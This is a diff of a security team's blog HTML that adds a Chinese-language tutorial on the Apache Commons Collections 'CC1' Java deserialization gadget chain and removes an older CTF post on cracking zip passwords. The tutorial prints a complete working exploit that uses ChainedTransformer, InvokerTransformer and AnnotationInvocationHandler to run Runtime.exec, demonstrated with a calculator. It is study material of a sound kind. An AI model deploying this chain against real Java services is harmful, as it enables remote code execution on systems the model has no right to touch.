@@ -206,6 +206,149 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/04/24/cc1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/04/24/cc1/" class="post-title-link" itemprop="url">java反射机制</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-04-24 21:36:00 / 修改时间：21:36:10" itemprop="dateCreated datePublished" datetime="2023-04-24T21:36:00+08:00">2023-04-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">web笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="TransformedMap版-CC1"><a href="#TransformedMap版-CC1" class="headerlink" title="TransformedMap版 CC1"></a>TransformedMap版 CC1</h1><h4 id="链子发现"><a href="#链子发现" class="headerlink" title="链子发现"></a>链子发现</h4><p>cc1的最终利用点就是<code>InvokerTransformer</code>中的transformer方法，接受一个Object对象，并通过反射的方式执行方法；</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420223801002.png" alt="image-20230420223801002"></p>
+<p>我们利用<code>InvokerTransformer</code>中的transformer方法弹计算器进行一个初步测试</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420225151769.png" alt="image-20230420225151769"></p>
+<p>ok测试成功，也就是说利用的最后一个位置已经找到了，我们需要继续找到对应的类中的同名函数进行利用</p>
+<p>这个时候我们需要逆推，找到那些类中调用了transform方法，且便于我们利用</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420234858964.png" alt="image-20230420234858964"></p>
+<p>通过查找我们发现有21个方法调用了transform，经过一个个的读取我们发现了我们transformmap可以为我们利用，先看他是因为其多次使用了transform方法所以选择从这里入手</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420235355079.png" alt="image-20230420235355079"></p>
+<p>我们看一下该类的构造方法</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001006012.png" alt="image-20230421001006012"></p>
+<p>和一些关键函数根据大佬的描述这里主要就是对key和value进行一个装饰，我们进行可以利用其静态方法进行变量的赋值</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001807370.png" alt="image-20230421001807370"></p>
+<p>但是下一个问题接踵而至，我们如何触发checkSetValue方法，从而执行transform，我们继续跟近源代码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421002038025.png" alt="image-20230421002038025"></p>
+<p>发现在<code>AbstractInputCheckedMapDecorator</code>中<code>MapEntry</code>类的<code>setValue</code>方法中调用了<code>checkSetValue</code>方法，恰巧<code>TransformedMap</code>继承于<code>AbstractInputCheckedMapDecorator</code>这个类；</p>
+<p>现在我们需要找如何触发setvalue方法，Entry&#x3D;&#x3D;&gt;在hashmap中指一个键值对，可以通过setkey或setvalue的方式改变key和value的值，这里是对setvalue的一个重写</p>
+<p>我们进行一个测试看链子是否能通</p>
+<p>如下是实现代码：</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421004133920.png" alt="image-20230421004133920"></p>
+<p>测试后弹计算器了说明我们的思路没什么问题；</p>
+<p>ok此时我们继续寻找，看如何调用<code>setvalue</code>,查看用法时发现在<code> AnnotationInvocationHandler</code>类中的readObject方法中调用了<code>setvalue</code></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421111422420.png" alt="image-20230421111422420"></p>
+<p>中<code>memberValues</code>调用了setvalue，我们读取其构造方法发现该参数值我们可控</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421113000784.png" alt="image-20230421113000784"></p>
+<p>这里有几个点需要注意，我们发现这个类并不是一个public的类，所以我们需要利用反射的方式去进行调用，思路如下</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421125031343.png" alt="image-20230421125031343"></p>
+<p>现在遇到了一些问题1、Runtime并没有继承序列化故不满足序列化条件；2、setvalue中传输的对象并不是我们所期望的对象</p>
+<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>1、Runtime并没有继承序列化故不满足序列化条件（Runtime没有继承Serialize）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化</span></span><br><span class="line"> <span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> a.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> a.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">//计算器测试</span></span><br><span class="line"> execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>根具上述代码我们将其转换rInvokerTransformer调用的方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(invokeMethod);</span><br></pre></td></tr></table></figure>
+
+<p>但是上述代码并非最佳选择因为我们多次调用transform方法，这里可以使用ChainedTransformer的transform方法来减少调用次数</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195149703.png" alt="image-20230424195149703"></p>
+<p>这里需要注意我们<code>.transform(Runtime.class);</code>因为是调用上一个所以我们可以使用ConstantTransformer中的transform方法来输出Runtime.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ConstantTransformer中的transform方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、<code> AnnotationInvocationHandler</code>类中的setvalue方法的使用</p>
+<p>AnnotationInvocationHandler的构造方法：</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192652479.png" alt="image-20230424192652479"></p>
+<p>我们看到上面有几个if判断</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192243587.png" alt="image-20230424192243587"></p>
+<p>这里的memberType是去找注释类中的成员方法，但是我们使用的<code>@Override</code>是没有成员变量的</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192857463.png" alt="image-20230424192857463"></p>
+<p>所以我们需要找一个注释中含有成员变量的最终我们锁定了<code>@Target</code></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193157726.png" alt="image-20230424193157726"></p>
+<p>这样我们将a中的key值改为value即可调用setvalue方法；</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193249678.png" alt="image-20230424193249678"></p>
+<h4 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h4><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195404895.png" alt="image-20230424195404895"></p>
+<p>执行效果：</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195446264.png" alt="image-20230424195446264"></p>
+<p>最后这里附上所有调试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        <span class="comment">//利用反射弹计算器</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        Class a = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method method = a.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        method.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用InvokerTransformer弹计算器</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用TransformedMap弹计算器</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; a = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        a.put(&quot;aaa&quot;,&quot;bbb&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(a,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        for (Map.Entry entry:transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//缕清思路</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; a = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        a.put(&quot;aaa&quot;,&quot;bbb&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(a,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//        annotationInvocationHandlerConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, invokerTransformer);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化</span></span><br><span class="line">        <span class="comment">//如利用反射机制完成弹计算器</span></span><br><span class="line"><span class="comment">//        Class a = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method method = a.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) method.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = a.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实现Method method = a.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime invokeMethod = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(invokeMethod);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//优化减少transform的调用次数</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//简单调试确定能执行弹计算器</span></span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; a = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        a.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(a,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//到此我们已经将Runtime不能反序列化的问题解决了，解析来我们需要解决第二个问题了</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/04/01/2023%E6%A5%9A%E6%85%A7%E6%9D%AFWP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1592,124 +1735,6 @@
 <p>之后便可查到flag了</p>
 <img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230059556.png" class="" title="image-20220812230059556">
 
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="nnnpc、commit、Eureka">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R3ape1团队笔记">
-      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | R3ape1团队笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/" class="post-title-link" itemprop="url">各种压缩包的加密</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-08-12 22:59:00 / 修改时间：22:59:23" itemprop="dateCreated datePublished" datetime="2022-08-12T22:59:00+08:00">2022-08-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E7%AC%94%E8%AE%B0/misc%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">misc笔记</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
-<p>第一个a.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
-
-<p>看了下有三个文件，1.txt，2.txt</p>
-<p>按照套路应该是CRC32爆破没错了，试试看</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
-
-<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
-<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
-<p>第二个f.zip</p>
-<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
-
-<p>五位数字爆破成功密码是61825</p>
-<p>第三个g.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
-
-<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
-<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
-
-<p>进行明文爆破，成功</p>
